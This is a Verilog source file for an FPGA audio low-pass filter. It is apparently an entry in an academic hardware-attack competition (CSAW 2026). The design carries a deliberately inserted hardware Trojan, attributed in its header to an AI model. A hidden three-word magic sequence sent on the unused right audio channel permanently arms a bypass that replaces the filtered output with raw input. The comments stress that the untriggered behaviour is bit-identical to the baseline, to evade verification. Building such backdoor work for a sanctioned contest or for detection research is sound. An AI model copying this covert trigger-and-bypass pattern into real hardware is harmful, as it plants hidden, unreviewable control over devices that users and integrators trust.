// =============================================================================
// fir_audio_top_trojan.v  -  CSAW 2026 Challenge 3, Phase 5C candidate C
//                           "Architecture-Driven" hardware-Trojan implementation
//
// AUTHORIZED CONTEXT: NYU CSAW 2026 AI Hardware Attack Challenge, finals
// Challenge 3 (academic CTF). This is a benign, sandboxed demonstration on the
// competitor's own Lattice iCE40-UP5K board. Untriggered behaviour is bit-
// identical to the recovered baseline; the trigger cannot fire on ordinary
// speech/music. This file is AI-generated (model provenance below).
//
// MODEL PROVENANCE:
//   * Baseline reconstruction (Phase 2) authored/verified previously; copied
//     here verbatim as the host design.
//   * Trojan trigger + payload designed and authored by Claude (Opus 4.8) under
//     the Phase 5C "architecture-driven" candidate, selected by a 7-agent
//     candidate-evaluation workflow (see ../ai/candidate-evaluation.workflow.json).
//
// ---------------------------------------------------------------------------
// DESIGN SUMMARY (candidate C: "right-slot covert knock -> filter bypass")
//
//   TRIGGER  (architecture-driven): The baseline deserializer shifts the RIGHT
//     I2S channel bits into rx_sh but NEVER captures them (it latches only the
//     left sample at L0 and strobes end_frame at R0). The right slot is thus a
//     control channel orthogonal to the audio datapath: no speech/music ever
//     exercises it. The Trojan captures right_sample at the existing R0 event
//     and watches for an ordered 3-frame magic knock
//         MAGIC0=16'hC0DE, MAGIC1=16'hFACE, MAGIC2=16'hBEEF
//     on three consecutive frames. seq_idx advances on an exact match and
//     resets on mismatch (with a one-step restart credit when the mismatching
//     value equals MAGIC0, so partial self-overlap cannot be gamed). On the 3rd
//     match the sticky `armed` flip-flop latches (per-frame-triple false match
//     probability = 2^-48 ~ 3.6e-15).
//
//   PAYLOAD: a single 16-bit 2:1 mux at the documented output-load point inside
//     the `if (end_frame)` block. The 63-tap MAC datapath (dl[], acc,
//     round_sat, y_filt) is left byte-for-byte untouched, so y_filt is always
//     the exact baseline FIR result. When armed, the left ("filtered") slot is
//     loaded from the latency-aligned `echo` register (raw input) instead of
//     y_filt, so all out-of-band energy above the ~3.3 kHz corner passes at
//     full gain -- a defeat of the "pass only in-band audio" asset. When not
//     armed, `y_d <= y_filt` exactly as baseline.
//
//   PARAMETER TROJAN_EN: 1 (default) builds the Trojan-present design; the
//     untriggered (armed==0) behaviour is bit-identical to baseline. 0 collapses
//     the added logic away (dead-code eliminated) to recover the exact baseline,
//     used only as a resource/equivalence reference build.
//
//   STICKY: `armed` never clears until power-on reset, matching the baseline's
//     reset-less (POR-only) design and making active-mode tests deterministic.
//
// Only the lines explicitly marked `// *** TROJAN` differ from the recovered
// baseline fir_audio_top.v. See ../reports for a line-level diff.
// =============================================================================
`default_nettype none

module fir_audio_top #(
    parameter TROJAN_EN = 1              // *** TROJAN: 1=present, 0=baseline
) (
    input  wire ICE_CLK,     // free-running ~10 MHz system clock
    input  wire I2S_BCLK,    // I2S bit clock (<= 1 MHz), oversampled
    input  wire I2S_WS,      // I2S word select (0=left, 1=right)
    input  wire I2S_SD_IN,   // serial data in (sample to filter, MSB first)
    output reg  I2S_SD_OUT,  // serial data out (left=filtered, right=echo)
    output wire ICE_LED,     // activity: high while the MAC is computing
    output wire RGB_R,       // status LEDs (active-low)
    output wire RGB_G,
    output wire RGB_B
);
    localparam integer NTAP = 63;

    // ----------------------------------------------------------------------
    // Recovered Q1.15 coefficients (symmetric, sum = 32768 = 1.0)
    // ----------------------------------------------------------------------
    reg signed [15:0] COEF [0:NTAP-1];
    integer ci;
    initial begin
        COEF[0]=-14;   COEF[1]=20;    COEF[2]=27;    COEF[3]=-12;
        COEF[4]=-45;   COEF[5]=-9;    COEF[6]=63;    COEF[7]=49;
        COEF[8]=-66;   COEF[9]=-109;  COEF[10]=34;   COEF[11]=176;
        COEF[12]=49;   COEF[13]=-219; COEF[14]=-187; COEF[15]=198;
        COEF[16]=362;  COEF[17]=-71;  COEF[18]=-524; COEF[19]=-188;
        COEF[20]=600;  COEF[21]=577;  COEF[22]=-497; COEF[23]=-1062;
        COEF[24]=104;  COEF[25]=1575; COEF[26]=752;  COEF[27]=-2030;
        COEF[28]=-2587;COEF[29]=2344; COEF[30]=10114;COEF[31]=13920;
        COEF[32]=10114;COEF[33]=2344; COEF[34]=-2587;COEF[35]=-2030;
        COEF[36]=752;  COEF[37]=1575; COEF[38]=104;  COEF[39]=-1062;
        COEF[40]=-497; COEF[41]=577;  COEF[42]=600;  COEF[43]=-188;
        COEF[44]=-524; COEF[45]=-71;  COEF[46]=362;  COEF[47]=198;
        COEF[48]=-187; COEF[49]=-219; COEF[50]=49;   COEF[51]=176;
        COEF[52]=34;   COEF[53]=-109; COEF[54]=-66;  COEF[55]=49;
        COEF[56]=63;   COEF[57]=-9;   COEF[58]=-45;  COEF[59]=-12;
        COEF[60]=27;   COEF[61]=20;   COEF[62]=-14;
    end

    // ----------------------------------------------------------------------
    // Input synchronizers + edge detection (oversampling the I2S lines)
    // ----------------------------------------------------------------------
    reg bclk_s0, bclk_s1, ws_s0, ws_s1, sd_s0, sd_s1;
    always @(posedge ICE_CLK) begin
        bclk_s0 <= I2S_BCLK; bclk_s1 <= bclk_s0;
        ws_s0   <= I2S_WS;   ws_s1   <= ws_s0;
        sd_s0   <= I2S_SD_IN;sd_s1   <= sd_s0;
    end
    wire bclk_rise = bclk_s0 & ~bclk_s1;
    wire bclk_fall = ~bclk_s0 & bclk_s1;
    wire ws_sync   = ws_s1;
    wire sd_sync   = sd_s1;

    // ----------------------------------------------------------------------
    // RX deserializer: recover the 16-bit left sample, MSB first.
    // A WS 0->1 transition (sampled between two BCLK rising edges) marks the
    // left LSB (L0); a WS 1->0 transition marks the right LSB (R0 / end frame).
    // ----------------------------------------------------------------------
    reg [15:0] rx_sh;
    reg        ws_prev_bclk;     // WS value at the previous BCLK rising edge
    reg [15:0] left_sample;
    reg        new_sample;       // 1-cycle strobe when a left sample completes
    reg        end_frame;        // 1-cycle strobe at R0 (frame boundary)

    // *** TROJAN: covert-knock trigger state read from the right I2S slot. The
    // *** right 16-bit sample is formed inline as {rx_sh[14:0],sd_sync} at the R0
    // *** event, exactly as the baseline forms left_sample at L0 (line above);
    // *** no separate capture register is needed.
    localparam [15:0] MAGIC0 = 16'hC0DE;             // *** TROJAN
    localparam [15:0] MAGIC1 = 16'hFACE;             // *** TROJAN
    localparam [15:0] MAGIC2 = 16'hBEEF;             // *** TROJAN
    reg [1:0]  seq_idx;                               // *** TROJAN 0..3 (3=locked)
    reg        armed;                                 // *** TROJAN sticky arm flag

    always @(posedge ICE_CLK) begin
        new_sample <= 1'b0;
        end_frame  <= 1'b0;
        if (bclk_rise) begin
            rx_sh <= {rx_sh[14:0], sd_sync};
            // L0: WS just went high (this is the 16th/left LSB bit)
            if (ws_sync & ~ws_prev_bclk) begin
                left_sample <= {rx_sh[14:0], sd_sync};
                new_sample  <= 1'b1;
            end
            // R0: WS just went low (end of frame)
            if (~ws_sync & ws_prev_bclk) begin
                end_frame <= 1'b1;
                // *** TROJAN: read the normally-discarded right sample and
                // *** advance the ordered covert-knock sequence detector.
                if (TROJAN_EN) begin                              // *** TROJAN
                    case (seq_idx)                               // *** TROJAN
                    2'd0: seq_idx <= ({rx_sh[14:0],sd_sync}==MAGIC0) ? 2'd1 : 2'd0;
                    2'd1: seq_idx <= ({rx_sh[14:0],sd_sync}==MAGIC1) ? 2'd2 :
                                     ({rx_sh[14:0],sd_sync}==MAGIC0) ? 2'd1 : 2'd0;
                    2'd2: if ({rx_sh[14:0],sd_sync}==MAGIC2) begin
                              seq_idx <= 2'd3; armed <= 1'b1;
                          end else
                              seq_idx <= ({rx_sh[14:0],sd_sync}==MAGIC0) ? 2'd1 : 2'd0;
                    default: seq_idx <= 2'd3;                    // *** TROJAN locked
                    endcase                                      // *** TROJAN
                end                                              // *** TROJAN
            end
            ws_prev_bclk <= ws_sync;
        end
    end

    // ----------------------------------------------------------------------
    // Serial multiply-accumulate FIR (direct form), one tap per ICE_CLK cycle.
    // On new_sample: shift the delay line, then accumulate over 63 taps.
    // ----------------------------------------------------------------------
    reg signed [15:0] dl [0:NTAP-1];       // sample delay line (newest = dl[0])
    reg        [6:0]  k;                    // tap index
    reg        busy;
    reg signed [39:0] acc;                  // wide accumulator (Q2.30-ish)
    reg signed [15:0] y_filt;               // latched filtered result
    reg signed [15:0] echo;                 // echo of the SAME input sample
    integer di;

    // round half toward +inf then saturate to int16
    function signed [15:0] round_sat;
        input signed [39:0] a;
        reg   signed [39:0] r;
        begin
            r = (a + 40'sd16384) >>> 15;
            if (r > 40'sd32767)       round_sat = 16'sd32767;
            else if (r < -40'sd32768) round_sat = -16'sd32768;
            else                      round_sat = r[15:0];
        end
    endfunction

    always @(posedge ICE_CLK) begin
        if (new_sample) begin
            // shift delay line, insert newest sample at dl[0]
            for (di = NTAP-1; di > 0; di = di - 1)
                dl[di] <= dl[di-1];
            dl[0] <= $signed(left_sample);
            echo  <= $signed(left_sample);   // echo tracks this input
            // start MAC next cycle (dl updated); accumulate from k=0
            acc  <= 40'sd0;
            k    <= 7'd0;
            busy <= 1'b1;
        end else if (busy) begin
            acc <= acc + dl[k] * COEF[k];
            if (k == NTAP-1) begin
                busy <= 1'b0;
            end
            k <= k + 7'd1;
        end
    end

    // latch the filtered result one cycle after the last accumulate
    reg busy_d;
    always @(posedge ICE_CLK) begin
        busy_d <= busy;
        if (busy_d & ~busy)                  // falling edge of busy = MAC done
            y_filt <= round_sat(acc);
    end
    assign ICE_LED = busy;

    // ----------------------------------------------------------------------
    // TX serializer: present {filtered, echo} MSB-first on SD_OUT, one bit per
    // BCLK (updated on the falling edge; the controller samples on the rising
    // edge). Reloaded at each frame boundary (end_frame).
    // ----------------------------------------------------------------------
    // One extra frame of delay so the reply to the sample in frame n appears in
    // frame n+2 (matches the original bitstream and the host tool's LATENCY=2).
    reg signed [15:0] y_d, echo_d;
    reg [31:0] tx_sh;
    reg        loaded;
    always @(posedge ICE_CLK) begin
        if (end_frame) begin
            tx_sh  <= {y_d, echo_d};         // previous frame's {filtered, echo}
            // *** TROJAN: payload mux. armed -> load raw input (echo) into the
            // *** "filtered" left slot (filter bypass); else exact baseline.
            y_d    <= (TROJAN_EN && armed) ? echo : y_filt;  // *** TROJAN
            echo_d <= echo;
            loaded <= 1'b1;
        end else if (bclk_fall && loaded) begin
            I2S_SD_OUT <= tx_sh[31];
            tx_sh      <= {tx_sh[30:0], 1'b0};
        end
    end

    // Status LEDs (active-low): green while streaming (frames seen), blue idle.
    assign RGB_G = ~loaded;      // low (on) once streaming
    assign RGB_B = loaded;       // high (off) once streaming
    assign RGB_R = 1'b1;         // overrun indicator (active-low): never asserts here

    // Power-up state (iCE40 FFs power up to 0); placed after all declarations.
    integer pi;
    initial begin
        I2S_SD_OUT = 1'b0; busy = 1'b0; busy_d = 1'b0; loaded = 1'b0;
        new_sample = 1'b0; end_frame = 1'b0; ws_prev_bclk = 1'b0;
        k = 7'd0; acc = 40'sd0; rx_sh = 16'd0; tx_sh = 32'd0;
        left_sample = 16'd0; y_filt = 16'd0; echo = 16'd0;
        y_d = 16'd0; echo_d = 16'd0;
        seq_idx = 2'd0; armed = 1'b0;                         // *** TROJAN
        for (pi = 0; pi < NTAP; pi = pi + 1) dl[pi] = 16'sd0;
    end

endmodule
`default_nettype wire
